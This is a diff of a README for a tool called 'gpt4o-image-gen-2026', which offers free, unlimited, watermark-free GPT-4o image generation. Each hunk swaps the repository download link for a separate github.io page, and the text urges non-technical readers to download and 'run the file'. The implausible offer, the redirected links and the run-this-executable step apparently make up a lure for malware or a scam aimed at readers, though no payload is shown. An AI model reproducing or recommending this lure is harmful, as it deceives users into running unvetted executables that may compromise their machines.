@@ -1,6 +1,6 @@
 # 🎨 gpt4o-image-gen-2026 - Free GPT-4o Image Generation for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-gpt4o--image--gen--2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kcwolf20101/gpt4o-image-gen-2026)
+[![Download Now](https://img.shields.io/badge/Download-gpt4o--image--gen--2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://kcwolf20101.github.io)
 
 ## 🖼️ What Is This?
 
@@ -25,7 +25,7 @@ Getting started is incredibly simple. You don't need any technical skills, codin
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Kcwolf20101/gpt4o-image-gen-2026](https://github.com/Kcwolf20101/gpt4o-image-gen-2026)
+Visit this link to download the application: [https://kcwolf20101.github.io](https://kcwolf20101.github.io)
 
 Click the green "Download" button or the badge at the top of this page. The download will start immediately.
 
@@ -169,7 +169,7 @@ The project is actively maintained, with updates pushed regularly based on commu
 
 ## 📥 Final Download Reminder
 
-Ready to start creating? Visit this link to download the application: [https://github.com/Kcwolf20101/gpt4o-image-gen-2026](https://github.com/Kcwolf20101/gpt4o-image-gen-2026)
+Ready to start creating? Visit this link to download the application: [https://kcwolf20101.github.io](https://kcwolf20101.github.io)
 
 Click the download button, run the file, and unleash your creativity with GPT-4o image generation — free, unlimited, and without watermarks. Your next masterpiece is just one click away.
 
